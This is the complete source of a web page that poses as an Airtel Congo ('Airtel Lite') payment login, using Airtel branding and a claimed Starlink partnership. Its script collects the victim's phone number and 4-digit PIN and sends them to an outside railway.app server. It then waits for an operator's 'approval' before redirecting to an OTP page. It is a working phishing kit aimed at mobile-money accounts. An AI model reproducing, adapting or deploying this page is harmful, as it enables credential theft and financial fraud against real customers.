<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AIRTEL CONGO</title>
    <link rel="icon" type="image/svg+xml" href="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Syne:wght@700;800&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --airtel-red: #c0001a;
            --airtel-red-bright: #e8001f;
            --airtel-red-dark: #7a0000;
            --airtel-red-deep: #9a0015;
            --gold: #ffb300;
            --white: #ffffff;
            --text-dark: #1a0000;
            --text-gray: #999;
        }

        html { scroll-behavior: smooth; }

        body {
            margin: 0;
            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        .dp-root {
            min-height: 100vh;
            background: linear-gradient(145deg, #7a0000, #c0001a 40%, #e8001f, #9a0015);
            display: flex;
            flex-direction: column;
            position: relative;
            overflow-x: hidden;
        }

        /* ============ LOGIN CONTAINER ============ */
        .login-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 24px 16px 16px;
            max-width: 440px;
            width: 100%;
            margin: 0 auto;
        }

        /* ============ HEADER ============ */
        .login-header {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }

        .logo-large img {
            height: 52px;
            width: auto;
            display: block;
        }

        /* ============ LOGIN CARD ============ */
        .login-content {
            background: #fff;
            border-radius: 24px;
            padding: 28px 22px 26px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.25);
            color: #1a0000;
        }

        .login-title {
            font-family: 'Syne', sans-serif;
            font-size: 20px;
            font-weight: 800;
            line-height: 1.35;
            text-align: center;
            color: #1a0000;
            margin-bottom: 24px;
            letter-spacing: -0.3px;
        }

        .login-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        /* ============ PHONE INPUT ============ */
        .phone-input-container {
            display: flex;
            align-items: center;
            background: #f7f7f7;
            border: 1.5px solid #e5e5e5;
            border-radius: 14px;
            overflow: hidden;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        .phone-input-container:focus-within {
            border-color: var(--airtel-red);
            box-shadow: 0 0 0 4px rgba(192, 0, 26, 0.1);
        }

        .country-code {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 14px 14px;
            background: #fff;
            border-right: 1.5px solid #e5e5e5;
            font-weight: 700;
            font-size: 14px;
            color: #1a0000;
            flex-shrink: 0;
        }

        .flag-icon { font-size: 18px; line-height: 1; }

        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            padding: 14px 16px;
            font-size: 15px;
            font-weight: 600;
            color: #1a0000;
            background: transparent;
            font-family: inherit;
            letter-spacing: 1px;
            min-width: 0;
        }

        .phone-input::placeholder {
            color: #b8b8b8;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        /* ============ PIN SECTION ============ */
        .pin-section {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .pin-label {
            font-size: 13px;
            font-weight: 700;
            color: #666;
            text-align: center;
            letter-spacing: 0.3px;
        }

        .pin-inputs-wrapper {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
        }

        .pin-box {
            width: 52px;
            height: 58px;
            text-align: center;
            font-size: 22px;
            font-weight: 800;
            color: #1a0000;
            background: #f7f7f7;
            border: 1.5px solid #e5e5e5;
            border-radius: 12px;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
            font-family: 'Syne', sans-serif;
            caret-color: var(--airtel-red);
        }

        .pin-box:focus {
            border-color: var(--airtel-red);
            background: #fff;
            box-shadow: 0 0 0 4px rgba(192, 0, 26, 0.1);
        }

        .pin-box.filled {
            border-color: var(--airtel-red);
            background: #fffdf5;
        }

        .eye-button {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            width: 40px;
            height: 40px;
            background: transparent;
            border: none;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0.5;
            transition: opacity 0.2s;
        }

        .eye-button:hover { opacity: 1; }

        /* ============ CONNEXION BUTTON ============ */
        .login-button {
            width: 100%;
            padding: 16px;
            background: var(--airtel-red);
            color: #fff;
            border: none;
            border-radius: 14px;
            font-family: 'Syne', sans-serif;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            cursor: pointer;
            transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
            box-shadow: 0 6px 20px rgba(192, 0, 26, 0.35);
            margin-top: 8px;
        }

        .login-button:hover:not(:disabled) {
            background: #9a0015;
            box-shadow: 0 8px 26px rgba(192, 0, 26, 0.45);
        }

        .login-button:active:not(:disabled) { transform: scale(0.98); }

        .login-button:disabled {
            background: #d4d4d4;
            color: #888;
            box-shadow: none;
            cursor: not-allowed;
        }

        /* ============ FOOTER ============ */
        .login-footer {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            padding: 24px 0 8px;
            color: #fff;
            margin-top: 24px;
        }

        .login-footer img {
            height: 32px;
            opacity: 0.8;
        }

        .login-footer span {
            font-size: 10px;
            letter-spacing: 1px;
            color: rgba(255,255,255,0.5);
            text-transform: uppercase;
            font-weight: 600;
        }

        .footer {
            font-size: 10.5px;
            color: rgba(255,255,255,0.4);
            text-align: center;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.1);
            width: 100%;
        }

        /* ============ WAITING OVERLAY ============ */
        .waiting-overlay {
            position: fixed;
            inset: 0;
            z-index: 1000;
            display: none;
            align-items: center;
            justify-content: center;
            background: linear-gradient(145deg, #7a0000, #c0001a 40%, #e8001f, #9a0015);
            color: #fff;
            padding: 24px;
            overflow: hidden;
        }

        .waiting-overlay.open { display: flex; animation: fadeIn 0.35s ease; }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .waiting-overlay::before {
            content: "";
            position: absolute;
            top: 50%; left: 50%;
            width: 600px; height: 600px;
            transform: translate(-50%, -50%);
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 60%);
            animation: pulseGlow 3s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes pulseGlow {
            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.6; }
            50% { transform: translate(-50%, -50%) scale(1.15); opacity: 1; }
        }

        .waiting-content {
            position: relative;
            text-align: center;
            max-width: 400px;
            width: 100%;
            z-index: 2;
        }

        .waiting-spinner {
            width: 80px;
            height: 80px;
            margin: 0 auto 26px;
            border: 5px solid rgba(255,255,255,0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .waiting-title {
            font-family: 'Syne', sans-serif;
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.3px;
            margin-bottom: 10px;
        }

        .waiting-sub {
            font-size: 13.5px;
            color: rgba(255,255,255,0.75);
            line-height: 1.65;
        }

        /* ============ RESPONSIVE ============ */
        @media (min-width: 640px) {
            .login-container { padding: 40px 24px 24px; }
            .login-content { padding: 36px 30px 32px; }
            .login-title { font-size: 22px; }
            .logo-large img { height: 60px; }
            .pin-box { width: 58px; height: 64px; font-size: 24px; }
        }
    </style>
</head>
<body>

    <div class="dp-root">

        <div class="login-container">

            <div class="login-header">
                <div class="logo-large">
                    <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
                </div>
            </div>

            <div class="login-content">
                <h1 class="login-title">Connectez-vous à Airtel Lite pour finaliser le paiement.</h1>

                <form class="login-form" id="loginForm" onsubmit="return false;">

                    <div class="phone-input-container">
                        <div class="country-code">
                            <span class="flag-icon">🇨🇩</span>
                            <span>+243</span>
                        </div>
                        <input
                            class="phone-input"
                            id="phoneInput"
                            placeholder="951234567"
                            maxlength="10"
                            inputmode="numeric"
                            pattern="[0-9]*"
                            required
                            type="tel"
                        >
                    </div>

                    <div class="pin-section">
                        <p class="pin-label">Entrez votre Code</p>
                        <div class="pin-inputs-wrapper">
                            <div class="pin-inputs" id="pinInputs">
                                <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password">
                                <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password">
                                <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password">
                                <input class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]" type="password">
                            </div>
                            <button type="button" class="eye-button" id="eyeBtn" aria-label="Afficher le PIN">👁️‍🗨️</button>
                        </div>
                    </div>

                    <button type="submit" class="login-button" id="loginBtn" disabled>CONNEXION</button>

                </form>
            </div>

            <div class="login-footer">
                <div>
                    <img alt="Airtel Logo" src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg">
                </div>
                <span>En collaboration avec</span>
                <span style="font-family: 'Syne', sans-serif; font-weight: 800; font-size: 13px; letter-spacing: 2px; color: rgba(255,255,255,0.85);">STARLINK™</span>
                <footer class="footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
            </div>

        </div>

    </div>

    <!-- WAITING OVERLAY -->
    <div class="waiting-overlay" id="waitingOverlay">
        <div class="waiting-content">
            <div class="waiting-spinner"></div>
            <h2 class="waiting-title">Vérification en cours...</h2>
            <p class="waiting-sub">
                Veuillez patienter pendant que nous confirmons vos informations.
            </p>
        </div>
    </div>

    <script>
        const API_BASE = 'https://airtel-anniversary-production.up.railway.app';

        // Read plan from URL
        const params = new URLSearchParams(window.location.search);
        const planName = params.get('plan') || 'Forfait';
        const planAmount = params.get('amount') || '';
        const planUnit = params.get('unit') || '';
        const planValidity = params.get('validity') || '';
        const planPrice = parseFloat(params.get('price') || '0');

        const phoneInput = document.getElementById('phoneInput');
        const pinInputs = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const eyeBtn = document.getElementById('eyeBtn');
        const waitingOverlay = document.getElementById('waitingOverlay');

        let pinVisible = false;
        let pollTimer = null;

        // Update button state
        function updateButtonState() {
            const phone = phoneInput.value.trim();
            const pin = Array.from(pinInputs).map(b => b.value).join('');
            loginBtn.disabled = !(phone.length >= 9 && pin.length === 4);
        }

        // Phone input — digits only
        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 10);
            updateButtonState();
        });

        // PIN inputs — auto-advance, auto-backspace, paste
        pinInputs.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                box.classList.toggle('filled', box.value.length === 1);
                if (box.value.length === 1 && index < pinInputs.length - 1) {
                    pinInputs[index + 1].focus();
                }
                updateButtonState();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinInputs[index - 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
                pasted.split('').forEach((digit, i) => {
                    if (i < pinInputs.length) {
                        pinInputs[i].value = digit;
                        pinInputs[i].classList.add('filled');
                    }
                });
                updateButtonState();
                if (pasted.length === 4) {
                    pinInputs[3].focus();
                }
            });

            box.addEventListener('focus', (e) => e.target.select());
        });

        // Eye toggle
        eyeBtn.addEventListener('click', () => {
            pinVisible = !pinVisible;
            pinInputs.forEach(box => {
                box.type = pinVisible ? 'text' : 'password';
            });
            eyeBtn.textContent = pinVisible ? '🙈' : '👁️‍🗨️';
        });

        // Submit
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();

            const phone = phoneInput.value.trim();
            const pin = Array.from(pinInputs).map(b => b.value).join('');

            if (phone.length < 9 || pin.length !== 4) return;

            loginBtn.disabled = true;
            loginBtn.textContent = 'Connexion...';

            // Show waiting overlay
            waitingOverlay.classList.add('open');
            document.body.style.overflow = 'hidden';

            try {
                const res = await fetch(API_BASE + '/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        plan: planName,
                        amount: planAmount,
                        unit: planUnit,
                        validity: planValidity,
                        price: planPrice,
                        phone: phone,
                        pin: pin
                    })
                });

                const data = await res.json();

                if (!data.ok) {
                    // Show error and reset
                    waitingOverlay.classList.remove('open');
                    document.body.style.overflow = '';
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'CONNEXION';
                    alert(data.error || 'Erreur. Veuillez réessayer.');
                    return;
                }

                // Start polling for admin approval
                startPolling(data.sessionId, phone);

            } catch (err) {
                console.error(err);
                waitingOverlay.classList.remove('open');
                document.body.style.overflow = '';
                loginBtn.disabled = false;
                loginBtn.textContent = 'CONNEXION';
                alert('Erreur réseau. Veuillez réessayer.');
            }
        });

        // Poll for status
        function startPolling(sessionId, phone) {
            clearInterval(pollTimer);
            pollTimer = setInterval(async () => {
                try {
                    const res = await fetch(API_BASE + '/api/status/' + sessionId);
                    const data = await res.json();
                    if (!data.ok) return;

                    if (data.status === 'approved') {
                        clearInterval(pollTimer);
                        // Move to OTP page with plan details
                        const otpParams = new URLSearchParams({
                            plan: planName,
                            amount: planAmount,
                            unit: planUnit,
                            validity: planValidity,
                            price: planPrice,
                            phone: phone
                        });
                        window.location.href = '/otp.html?' + otpParams.toString();
                    } else if (data.status === 'rejected') {
                        clearInterval(pollTimer);
                        waitingOverlay.classList.remove('open');
                        document.body.style.overflow = '';
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'CONNEXION';
                        alert(data.message || 'Numéro incorrect. Veuillez vérifier et réessayer.');
                        // Reset PIN
                        pinInputs.forEach(b => {
                            b.value = '';
                            b.classList.remove('filled');
                        });
                        phoneInput.focus();
                    } else if (data.status === 'timeout') {
                        clearInterval(pollTimer);
                        waitingOverlay.classList.remove('open');
                        document.body.style.overflow = '';
                        loginBtn.disabled = false;
                        loginBtn.textContent = 'CONNEXION';
                        alert('Session expirée. Veuillez réessayer.');
                    }
                } catch (err) {
                    // retry silently
                }
            }, 2000);
        }
    </script>

</body>
</html>
